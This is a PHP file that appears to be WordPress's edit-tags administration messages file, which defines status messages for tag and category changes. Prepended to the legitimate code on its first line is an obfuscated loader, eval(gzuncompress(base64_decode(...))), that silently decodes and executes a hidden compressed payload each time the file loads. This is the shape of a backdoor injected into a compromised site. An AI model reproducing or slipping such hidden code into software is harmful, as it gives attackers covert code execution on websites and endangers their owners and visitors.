<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Edit Tags Administration: Messages
 *
 * @package WordPress
 * @subpackage Administration
 * @since 4.4.0
 */

$messages = array();
// 0 = unused. Messages start at index 1.
$messages['_item'] = array(
	0 => '',
	1 => __( 'Item added.' ),
	2 => __( 'Item deleted.' ),
	3 => __( 'Item updated.' ),
	4 => __( 'Item not added.' ),
	5 => __( 'Item not updated.' ),
	6 => __( 'Items deleted.' ),
);

$messages['category'] = array(
	0 => '',
	1 => __( 'Category added.' ),
	2 => __( 'Category deleted.' ),
	3 => __( 'Category updated.' ),
	4 => __( 'Category not added.' ),
	5 => __( 'Category not updated.' ),
	6 => __( 'Categories deleted.' ),
);

$messages['post_tag'] = array(
	0 => '',
	1 => __( 'Tag added.' ),
	2 => __( 'Tag deleted.' ),
	3 => __( 'Tag updated.' ),
	4 => __( 'Tag not added.' ),
	5 => __( 'Tag not updated.' ),
	6 => __( 'Tags deleted.' ),
);

/**
 * Filters the messages displayed when a tag is updated.
 *
 * @since 3.7.0
 *
 * @param array $messages The messages to be displayed.
 */
$messages = apply_filters( 'term_updated_messages', $messages );

$message = false;
if ( isset( $_REQUEST['message'] ) && ( $msg = (int) $_REQUEST['message'] ) ) {
	if ( isset( $messages[ $taxonomy ][ $msg ] ) ) {
		$message = $messages[ $taxonomy ][ $msg ];
	} elseif ( ! isset( $messages[ $taxonomy ] ) && isset( $messages['_item'][ $msg ] ) ) {
		$message = $messages['_item'][ $msg ];
	}
}